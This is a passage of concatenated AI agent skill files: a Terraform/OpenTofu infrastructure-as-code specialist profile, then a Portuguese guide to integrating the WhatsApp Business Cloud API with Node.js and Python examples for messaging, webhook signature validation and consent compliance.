2. Design modules and choose a remote state backend.
3. Implement plan/apply workflows with reviews and policies.
4. Validate drift, costs, and rollback strategies.

## Safety

- Always review plans before applying changes.
- Protect state files and avoid exposing secrets.

## Purpose
Expert Infrastructure as Code specialist with comprehensive knowledge of Terraform, OpenTofu, and modern IaC ecosystems. Masters advanced module design, state management, provider development, and enterprise-scale infrastructure automation. Specializes in GitOps workflows, policy as code, and complex multi-cloud deployments.

## Capabilities

### Terraform/OpenTofu Expertise
- **Core concepts**: Resources, data sources, variables, outputs, locals, expressions
- **Advanced features**: Dynamic blocks, for_each loops, conditional expressions, complex type constraints
- **State management**: Remote backends, state locking, state encryption, workspace strategies
- **Module development**: Composition patterns, versioning strategies, testing frameworks
- **Provider ecosystem**: Official and community providers, custom provider development
- **OpenTofu migration**: Terraform to OpenTofu migration strategies, compatibility considerations

### Advanced Module Design
- **Module architecture**: Hierarchical module design, root modules, child modules
- **Composition patterns**: Module composition, dependency injection, interface segregation
- **Reusability**: Generic modules, environment-specific configurations, module registries
- **Testing**: Terratest, unit testing, integration testing, contract testing
- **Documentation**: Auto-generated documentation, examples, usage patterns
- **Versioning**: Semantic versioning, compatibility matrices, upgrade guides

### State Management & Security
- **Backend configuration**: S3, Azure Storage, GCS, Terraform Cloud, Consul, etcd
- **State encryption**: Encryption at rest, encryption in transit, key management
- **State locking**: DynamoDB, Azure Storage, GCS, Redis locking mechanisms
- **State operations**: Import, move, remove, refresh, advanced state manipulation
- **Backup strategies**: Automated backups, point-in-time recovery, state versioning
- **Security**: Sensitive variables, secret management, state file security

### Multi-Environment Strategies
- **Workspace patterns**: Terraform workspaces vs separate backends
- **Environment isolation**: Directory structure, variable management, state separation
- **Deployment strategies**: Environment promotion, blue/green deployments
- **Configuration management**: Variable precedence, environment-specific overrides
- **GitOps integration**: Branch-based workflows, automated deployments

### Provider & Resource Management
- **Provider configuration**: Version constraints, multiple providers, provider aliases
- **Resource lifecycle**: Creation, updates, destruction, import, replacement
- **Data sources**: External data integration, computed values, dependency management
- **Resource targeting**: Selective operations, resource addressing, bulk operations
- **Drift detection**: Continuous compliance, automated drift correction
- **Resource graphs**: Dependency visualization, parallelization optimization

### Advanced Configuration Techniques
- **Dynamic configuration**: Dynamic blocks, complex expressions, conditional logic
- **Templating**: Template functions, file interpolation, external data integration
- **Validation**: Variable validation, precondition/postcondition checks
- **Error handling**: Graceful failure handling, retry mechanisms, recovery strategies
- **Performance optimization**: Resource parallelization, provider optimization

### CI/CD & Automation
- **Pipeline integration**: GitHub Actions, GitLab CI, Azure DevOps, Jenkins
- **Automated testing**: Plan validation, policy checking, security scanning
- **Deployment automation**: Automated apply, approval workflows, rollback strategies
- **Policy as Code**: Open Policy Agent (OPA), Sentinel, custom validation
- **Security scanning**: tfsec, Checkov, Terrascan, custom security policies
- **Quality gates**: Pre-commit hooks, continuous validation, compliance checking

### Multi-Cloud & Hybrid
- **Multi-cloud patterns**: Provider abstraction, cloud-agnostic modules
- **Hybrid deployments**: On-premises integration, edge computing, hybrid connectivity
- **Cross-provider dependencies**: Resource sharing, data passing between providers
- **Cost optimization**: Resource tagging, cost estimation, optimization recommendations
- **Migration strategies**: Cloud-to-cloud migration, infrastructure modernization

### Modern IaC Ecosystem
- **Alternative tools**: Pulumi, AWS CDK, Azure Bicep, Google Deployment Manager
- **Complementary tools**: Helm, Kustomize, Ansible integration
- **State alternatives**: Stateless deployments, immutable infrastructure patterns
- **GitOps workflows**: ArgoCD, Flux integration, continuous reconciliation
- **Policy engines**: OPA/Gatekeeper, native policy frameworks

### Enterprise & Governance
- **Access control**: RBAC, team-based access, service account management
- **Compliance**: SOC2, PCI-DSS, HIPAA infrastructure compliance
- **Auditing**: Change tracking, audit trails, compliance reporting
- **Cost management**: Resource tagging, cost allocation, budget enforcement
- **Service catalogs**: Self-service infrastructure, approved module catalogs

### Troubleshooting & Operations
- **Debugging**: Log analysis, state inspection, resource investigation
- **Performance tuning**: Provider optimization, parallelization, resource batching
- **Error recovery**: State corruption recovery, failed apply resolution
- **Monitoring**: Infrastructure drift monitoring, change detection
- **Maintenance**: Provider updates, module upgrades, deprecation management

## Behavioral Traits
- Follows DRY principles with reusable, composable modules
- Treats state files as critical infrastructure requiring protection
- Always plans before applying with thorough change review
- Implements version constraints for reproducible deployments
- Prefers data sources over hardcoded values for flexibility
- Advocates for automated testing and validation in all workflows
- Emphasizes security best practices for sensitive data and state management
- Designs for multi-environment consistency and scalability
- Values clear documentation and examples for all modules
- Considers long-term maintenance and upgrade strategies

## Knowledge Base
- Terraform/OpenTofu syntax, functions, and best practices
- Major cloud provider services and their Terraform representations
- Infrastructure patterns and architectural best practices
- CI/CD tools and automation strategies
- Security frameworks and compliance requirements
- Modern development workflows and GitOps practices
- Testing frameworks and quality assurance approaches
- Monitoring and observability for infrastructure

## Response Approach
1. **Analyze infrastructure requirements** for appropriate IaC patterns
2. **Design modular architecture** with proper abstraction and reusability
3. **Configure secure backends** with appropriate locking and encryption
4. **Implement comprehensive testing** with validation and security checks
5. **Set up automation pipelines** with proper approval workflows
6. **Document thoroughly** with examples and operational procedures
7. **Plan for maintenance** with upgrade strategies and deprecation handling
8. **Consider compliance requirements** and governance needs
9. **Optimize for performance** and cost efficiency

## Example Interactions
- "Design a reusable Terraform module for a three-tier web application with proper testing"
- "Set up secure remote state management with encryption and locking for multi-team environment"
- "Create CI/CD pipeline for infrastructure deployment with security scanning and approval workflows"
- "Migrate existing Terraform codebase to OpenTofu with minimal disruption"
- "Implement policy as code validation for infrastructure compliance and cost control"
- "Design multi-cloud Terraform architecture with provider abstraction"
- "Troubleshoot state corruption and implement recovery procedures"
- "Create enterprise service catalog with approved infrastructure modules"

## Source: references/skills/cloud-architect/references/legacy/whatsapp-cloud-api/SKILL.md

---
name: whatsapp-cloud-api
description: Integracao com WhatsApp Business Cloud API (Meta). Mensagens, templates, webhooks HMAC-SHA256, automacao de atendimento. Boilerplates Node.js e Python.
risk: critical
source: community
date_added: '2026-03-06'
author: renat
tags:
- messaging
- whatsapp
- meta
- webhooks
tools:
- agent-compatible
- agent-compatible
- agent-compatible
- agent-compatible
- agent-compatible
---

# WhatsApp Cloud API - Integracao Profissional

## Overview

Integracao com WhatsApp Business Cloud API (Meta). Mensagens, templates, webhooks HMAC-SHA256, automacao de atendimento. Boilerplates Node.js e Python.

## When to Use This Skill

- When the user mentions "whatsapp" or related topics
- When the user mentions "whatsapp business" or related topics
- When the user mentions "api whatsapp" or related topics
- When the user mentions "chatbot whatsapp" or related topics
- When the user mentions "mensagem whatsapp" or related topics
- When the user mentions "template whatsapp" or related topics

## Do Not Use This Skill When

- The task is unrelated to whatsapp cloud api
- A simpler, more specific tool can handle the request
- The user needs general-purpose assistance without domain expertise

## How It Works

Skill para implementar integracoes profissionais com WhatsApp Business usando a Cloud API oficial da Meta. Suporta Node.js/TypeScript e Python.

## Overview

A WhatsApp Cloud API e a API oficial da Meta para envio e recebimento de mensagens via WhatsApp Business. Desde outubro 2025, e a unica opcao suportada (a API On-Premises foi descontinuada).

**Versao da API:** Graph API v21.0 (2026)
**Base URL:** `https://graph.facebook.com/v21.0/{phone-number-id}/messages`
**Autenticacao:** Bearer Token (System User Token para producao)

**Pricing 2026 (por mensagem):**

| Categoria      | Custo             | Quando cobrado                          |
|----------------|-------------------|-----------------------------------------|
| Marketing      | $0.025-$0.1365    | Campanhas, promocoes                    |
| Utility        | $0.004-$0.0456    | Confirmacoes de pedido, atualizacoes    |
| Authentication | $0.004-$0.0456    | OTP, reset de senha                     |
| Service        | GRATIS            | Resposta dentro da janela de 24h        |

**Pre-requisitos:**
- Conta Meta Business Suite (gratuita)
- App no Meta for Developers com produto WhatsApp
- Numero de telefone verificado
- System User Token (permanente)

Se o usuario nao tem conta Meta Business, leia `references/setup-guide.md` para o guia completo de setup do zero.

---

## Decision Tree

Use esta arvore para determinar o proximo passo:

```
O usuario precisa de setup inicial?
├── SIM → Leia references/setup-guide.md
└── NAO → Qual linguagem?
    ├── Node.js/TypeScript
    └── Python
    → O que quer fazer?
       ├── Enviar mensagens → Secao "Tipos de Mensagem" abaixo
       ├── Receber mensagens → Secao "Webhooks" abaixo
       ├── Automatizar atendimento → Secao "Automacao" abaixo
       ├── WhatsApp Flows / Commerce → Secao "Features Avancados" abaixo
       ├── Gerenciar templates → references/template-management.md
       └── Compliance / limites → Secao "Compliance & Quality" abaixo
```

Para iniciar um projeto do zero com boilerplate pronto, use o script:
```bash
python scripts/setup_project.py --language nodejs --path ./meu-projeto

## Ou

python scripts/setup_project.py --language python --path ./meu-projeto
```

---

## 1. Configurar Variaveis De Ambiente

```env
WHATSAPP_TOKEN=seu_access_token_aqui
PHONE_NUMBER_ID=seu_phone_number_id
WABA_ID=seu_whatsapp_business_account_id
APP_SECRET=seu_app_secret
VERIFY_TOKEN=token_customizado_para_webhook
```

## 2. Enviar Mensagem De Texto Simples

**Node.js/TypeScript:**
```typescript
import axios from 'axios';

const GRAPH_API = 'https://graph.facebook.com/v21.0';

async function sendText(to: string, message: string) {
  const response = await axios.post(
    `${GRAPH_API}/${process.env.PHONE_NUMBER_ID}/messages`,
    {
      messaging_product: 'whatsapp',
      to,
      type: 'text',
      text: { body: message }
    },
    { headers: { Authorization: `Bearer ${process.env.WHATSAPP_TOKEN}` } }
  );
  return response.data; // { messaging_product, contacts, messages: [{ id }] }
}
```

**Python:**
```python
import httpx
import os

GRAPH_API = "https://graph.facebook.com/v21.0"

async def send_text(to: str, message: str) -> dict:
    async with httpx.AsyncClient() as client:
        response = await client.post(
            f"{GRAPH_API}/{os.environ['PHONE_NUMBER_ID']}/messages",
            json={
                "messaging_product": "whatsapp",
                "to": to,
                "type": "text",
                "text": {"body": message}
            },
            headers={"Authorization": f"Bearer {os.environ['WHATSAPP_TOKEN']}"}
        )
        return response.json()  # {"messaging_product", "contacts", "messages": [{"id"}]}
```

## 3. Enviar Template Message (Fora Da Janela De 24H)

Templates sao a unica forma de iniciar conversa com um cliente. Devem ser aprovados pela WhatsApp antes do uso.

```json
{
  "messaging_product": "whatsapp",
  "to": "5511999999999",
  "type": "template",
  "template": {
    "name": "hello_world",
    "language": { "code": "pt_BR" },
    "components": [
      {
        "type": "body",
        "parameters": [
          { "type": "text", "text": "João" }
        ]
      }
    ]
  }
}
```

## 4. Verificar Entrega

Use o script de teste para validar:
```bash
python scripts/send_test_message.py --to 5511999999999 --message "Teste de integracao"
```

---

## Tipos De Mensagem

| Tipo               | Uso                                   | Limite           |
|--------------------|---------------------------------------|------------------|
| Text               | Mensagens simples de texto            | 4096 chars       |
| Template           | Iniciar conversa / fora da janela 24h | 1600 chars body  |
| Image              | Fotos e imagens                       | 5MB              |
| Document           | PDFs, planilhas, docs                 | 100MB            |
| Video              | Videos                                | 16MB             |
| Audio              | Mensagens de voz                      | 16MB             |
| Interactive Button | Botoes de resposta rapida             | Max 3 botoes     |
| Interactive List   | Menu com opcoes em secoes             | Max 10 opcoes    |
| Location           | Compartilhar localizacao              | lat/long         |
| Contact            | Compartilhar contato                  | vCard format     |
| Reaction           | Reagir com emoji a mensagem           | 1 emoji          |

**Exemplo - Botoes interativos (Node.js):**
```typescript
async function sendButtons(to: string, body: string, buttons: Array<{id: string, title: string}>) {
  return axios.post(`${GRAPH_API}/${process.env.PHONE_NUMBER_ID}/messages`, {
    messaging_product: 'whatsapp',
    to,
    type: 'interactive',
    interactive: {
      type: 'button',
      body: { text: body },
      action: {
        buttons: buttons.map(b => ({
          type: 'reply',
          reply: { id: b.id, title: b.title }
        }))
      }
    }
  }, { headers: { Authorization: `Bearer ${process.env.WHATSAPP_TOKEN}` } });
}

// Uso:
await sendButtons('5511999999999', 'Como posso ajudar?', [
  { id: 'suporte', title: 'Suporte' },
  { id: 'vendas', title: 'Vendas' },
  { id: 'info', title: 'Informacoes' }
]);
```

**Para exemplos completos de todos os tipos em Node.js e Python**, leia `references/message-types.md`.

---

## Webhooks

Webhooks permitem receber mensagens e atualizacoes de status em tempo real.

## Verificacao (Get) - Obrigatorio

Quando voce configura o webhook no Meta Developers, a Meta envia um GET para verificar:

```typescript
// Node.js (Express)
app.get('/webhook', (req, res) => {
  const mode = req.query['hub.mode'];
  const token = req.query['hub.verify_token'];
  const challenge = req.query['hub.challenge'];

  if (mode === 'subscribe' && token === process.env.VERIFY_TOKEN) {
    res.status(200).send(challenge);
  } else {
    res.sendStatus(403);
  }
});
```

## Recebimento (Post) - Com Seguranca Hmac-Sha256

Toda notificacao de webhook vem assinada no header `X-Hub-Signature-256`. Valide SEMPRE antes de processar:

```typescript
import crypto from 'crypto';

function validateSignature(rawBody: Buffer, signature: string): boolean {
  const expectedSig = crypto
    .createHmac('sha256', process.env.APP_SECRET!)
    .update(rawBody)
    .digest('hex');
  return crypto.timingSafeEqual(
    Buffer.from(`sha256=${expectedSig}`),
    Buffer.from(signature)
  );
}
```

**Importante:** Usar `crypto.timingSafeEqual` (Node.js) ou `hmac.compare_digest` (Python) para prevenir timing attacks. Nunca use comparacao simples de strings.

## Eventos Recebidos

- **messages** - Mensagem do cliente (texto, midia, botao, localizacao)
- **statuses** - Atualizado de status (sent → delivered → read)
- **errors** - Erros de entrega

**Requisitos:**
- Endpoint HTTPS com certificado SSL valido
- Responder com HTTP 200 em ate 5 segundos
- Dev: use ngrok para teste local

**Para setup completo com exemplos Node.js e Python**, leia `references/webhook-setup.md`.

---

## Menu Principal Interativo

Use botoes ou listas para criar um menu de opcoes na primeira interacao:

```python

## Python - Menu Com Lista Interativa

async def send_main_menu(to: str):
    await send_interactive_list(
        to=to,
        header="Bem-vindo!",
        body="Selecione o que precisa:",
        button_text="Ver opcoes",
        sections=[{
            "title": "Atendimento",
            "rows": [
                {"id": "suporte", "title": "Suporte Tecnico", "description": "Ajuda com problemas"},
                {"id": "vendas", "title": "Vendas", "description": "Conhecer nossos produtos"},
                {"id": "financeiro", "title": "Financeiro", "description": "Boletos e pagamentos"},
            ]
        }]
    )
```

## State Machine Para Fluxos

Gerencie conversas com uma maquina de estados. Cada cliente tem um estado atual que determina como a proxima mensagem sera processada:

```
INICIO → MENU_PRINCIPAL → SUPORTE → AGUARDANDO_DETALHES → ESCALACAO_HUMANO
                        → VENDAS → CATALOGO → CHECKOUT
                        → FINANCEIRO → SEGUNDA_VIA_BOLETO
```

## Janela De 24 Horas

- **Dentro da janela (24h apos ultima mensagem do cliente):** Pode enviar qualquer tipo de mensagem gratuitamente
- **Fora da janela:** Apenas template messages (cobradas por categoria)

## Integracao Com Ia (LLM API)

Combine WhatsApp com AI assistant para respostas inteligentes:
1. Receba mensagem via webhook
2. Envie para LLM API com contexto da conversa
3. Retorne resposta via WhatsApp
4. Mantenha escalacao para humano disponivel

**Para padroes completos de automacao**, leia `references/automation-patterns.md`.

---

## Whatsapp Flows

Formularios interativos multi-tela dentro do WhatsApp. O cliente preenche campos sem sair do app. Definidos em JSON com screens, components e actions.

Use cases: cadastros, agendamentos, pesquisas NPS, selecao de produtos.

## Commerce & Catalogo

Ate 500 produtos no catalogo WhatsApp. Envie mensagens de produto individual ou multi-produto com checkout in-app.

## Template Management Api

Crie, liste e delete templates programaticamente. Ate 6000 traducoes por conta. Aprovacao em minutos.

## Whatsapp Channels

Broadcasting unidirecional para subscribers ilimitados. Localizado na aba "Atualizacoes" do WhatsApp.

## Click-To-Whatsapp Ads

Anuncios no Facebook/Instagram com botao que abre conversa no WhatsApp. 99% de taxa de abertura.

## Status Tracking

Rastreie entrega: pending → server → device → read. Receba via webhook de status updates.

**Para detalhes completos de features avancados**, leia `references/advanced-features.md`.
**Para gerenciamento de templates via API**, leia `references/template-management.md`.

---

## Checklist Essencial

- [ ] Opt-in explicito obtido antes de enviar mensagens
- [ ] Mecanismo de opt-out implementado (keyword "SAIR" ou "STOP")
- [ ] Registro de consentimento com timestamp, metodo e proposito
- [ ] Conteudo dentro das politicas do WhatsApp (sem spam, sem conteudo proibido)
- [ ] LGPD/GDPR compliance (base legal definida, direitos do titular)
- [ ] Frequencia de mensagens adequada (nao excessiva)
- [ ] Templates aprovados antes do uso
- [ ] Verificacao de negocio completa (para limites maiores)

## Quality Rating

O WhatsApp monitora a qualidade das suas mensagens e atribui um rating:

| Rating    | Significado                        | Acao                              |
|-----------|------------------------------------|-----------------------------------|
| Verde     | Boa qualidade, poucos bloqueios    | Manter — elegivel para upgrade    |
| Amarelo   | Qualidade media, atencao necessaria| Revisar conteudo e frequencia     |
| Vermelho  | Qualidade baixa, risco de suspensao| Acao imediata: reduzir volume     |

**Sinais positivos:** Alta taxa de resposta, engajamento, poucos bloqueios
**Sinais negativos:** Bloqueios, reports de spam, baixo engajamento

## Tier System (Limites De Mensagem)

Desde outubro 2025, limites sao por **Business Portfolio** (nao por numero):

| Tier         | Conversas/24h | Como alcancar                           |
|--------------|---------------|------------------------------------------|
| Inicial      | 250           | Conta nova / nao verificada              |
| Tier 1       | 1,000         | Auto-upgrade: 50%+ do limite por 7 dias  |
| Tier 2       | 10,000        | Auto-upgrade: 50%+ do limite por 7 dias  |
| Tier 3       | 100,000       | Auto-upgrade: 50%+ do limite por 7 dias  |
| Unlimited    | Ilimitado     | Auto-upgrade: 50%+ do limite por 7 dias  |

**Mudancas 2026:** Tiers 2K e 10K serao removidos. Apos verificacao de negocio, limite imediato de 100K.

**Para guia completo de compliance**, leia `references/compliance.md`.

---

## Troubleshooting

| Problema                       | Causa Provavel                     | Solucao                                    |
|--------------------------------|------------------------------------|--------------------------------------------|
| 401 Unauthorized               | Token expirado ou invalido         | Gerar novo System User Token               |
| 400 Bad Request                | Payload malformado                 | Verificar JSON contra exemplos             |
| Template rejeitado             | Conteudo viola politicas           | Revisar e resubmeter com alteracoes        |
| Webhook nao recebe             | URL invalida ou sem HTTPS          | Usar ngrok (dev) ou certificado SSL (prod) |
| Rate limit exceeded            | Ultrapassou 80 msg/s              | Implementar queue com retry                |
| Quality rating baixo           | Muitos bloqueios/reports           | Reduzir volume, melhorar conteudo          |
| Mensagem nao entregue          | Numero invalido ou nao no WhatsApp | Validar numero antes de enviar             |
| Numero nao verificado          | OTP nao completado                 | Repetir verificacao via SMS ou ligacao      |

Para validar sua configuracao:
```bash
python scripts/validate_config.py
```

---

## Referencias (Leia Conforme Necessidade)

| Arquivo                        | Quando ler                                        |
|--------------------------------|---------------------------------------------------|
| `references/setup-guide.md`    | Setup inicial — criar conta Meta, configurar API  |
| `references/message-types.md`  | Exemplos completos de todos os tipos de mensagem   |
| `references/webhook-setup.md`  | Configurar webhooks com seguranca HMAC             |
| `references/automation-patterns.md` | Chatbot, filas, state machine, integracao IA  |
| `references/compliance.md`     | LGPD/GDPR, opt-in, quality rating, tier system    |
| `references/api-reference.md`  | Endpoints, erros, rate limits, pricing 2026        |
| `references/advanced-features.md` | Flows, Commerce, Channels, Ads, Status Tracking|
| `references/template-management.md` | CRUD de templates via API                     |

## Scripts

| Script                         | O que faz                                         |
|--------------------------------|---------------------------------------------------|
| `scripts/setup_project.py`     | Cria projeto com boilerplate (Node.js ou Python)   |
| `scripts/validate_config.py`   | Valida credenciais e conexao com a API             |
| `scripts/send_test_message.py` | Envia mensagem teste para validar setup            |

## Boilerplate

| Diretorio                      | Conteudo                                          |
|--------------------------------|---------------------------------------------------|
| `assets/boilerplate/nodejs/`   | Projeto TypeScript/Express completo                |
| `assets/boilerplate/python/`   | Projeto Python/Flask completo                      |
| `assets/examples/`             | Exemplos de payloads JSON (templates, webhooks, flows) |

## Best Practices

- Provide clear, specific context about your project and requirements
- Review all suggestions before applying them to production code
- Combine with other complementary skills for comprehensive analysis

## Common Pitfalls

- Using this skill for tasks outside its domain expertise
- Applying recommendations without understanding your specific context
- Not providing enough project context for accurate analysis

## Related Skills

- `instagram` - Complementary skill for enhanced analysis
- `social-orchestrator` - Complementary skill for enhanced analysis
- `telegram` - Complementary skill for enhanced analysis

